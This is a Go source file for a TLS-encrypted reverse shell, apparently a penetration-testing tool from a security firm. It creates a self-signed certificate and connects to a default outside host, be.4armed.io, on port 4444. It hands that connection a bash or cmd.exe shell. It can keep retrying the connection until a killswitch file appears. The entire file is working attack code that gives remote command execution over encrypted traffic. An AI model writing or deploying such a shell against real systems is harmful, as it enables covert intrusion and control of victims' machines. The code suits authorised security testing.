package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"flag"
	"fmt"
	"log"
	"log/slog"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"time"
)

func publicKey(priv interface{}) interface{} {
	switch k := priv.(type) {
	case *ecdsa.PrivateKey:
		return &k.PublicKey
	default:
		return nil
	}
}

func main() {
	var defaultCmd string

	switch runtime.GOOS {
	case "windows":
		defaultCmd = "cmd.exe"
	default:
		defaultCmd = "bash"
	}

	host := flag.String("h", "be.4armed.io", "Host to connect to")
	port := flag.String("p", "4444", "Port to connect to")
	command := flag.String("c", defaultCmd, "Command to run")
	keepTrying := flag.Bool("k", false, "Keep trying to connect")
	retry := flag.Int("r", 60, "Retry interval in seconds")
	killswitchFile := flag.String("killswitch", "/tmp/.revshellkillswitch", "If this file exists, the revshell program will exit")
	flag.Parse()

	connectionString := fmt.Sprintf("%s:%s", *host, *port)

	cmd := exec.Command(*command)
	priv, err := ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
	if err != nil {
		log.Fatal(err)
	}
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"4ARMED Limited"},
		},
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(time.Hour * 24 * 180),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, publicKey(priv), priv)
	if err != nil {
		log.Fatalf("Failed to create certificate: %s", err)
	}

	cert := tls.Certificate{
		Certificate: [][]byte{derBytes},
		PrivateKey:  priv,
	}

	// Load our generated key and cert. Don't verify the cert at the remote end
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	var conn *tls.Conn

	if *keepTrying {
		for {
			if _, err := os.Stat(*killswitchFile); err == nil {
				slog.Info("killswitch file exists, exiting")
				rmErr := os.Remove(*killswitchFile)
				if rmErr != nil {
					slog.Error("failed to remove killswitch file", "err", rmErr)
				}
				os.Exit(0)
			}

			conn, err = tls.Dial("tcp", connectionString, &config)
			if err != nil {
				slog.Error("connection error", "err", err)
				time.Sleep(time.Duration(*retry) * time.Second)
				continue
			}
			slog.Info("connected", "host", *host, "port", *port, "command", *command)

			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
		}
	} else {
		conn, err = tls.Dial("tcp", connectionString, &config)
		if err != nil {
			slog.Error("connection error", "err", err)
			os.Exit(1)
		}

		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}
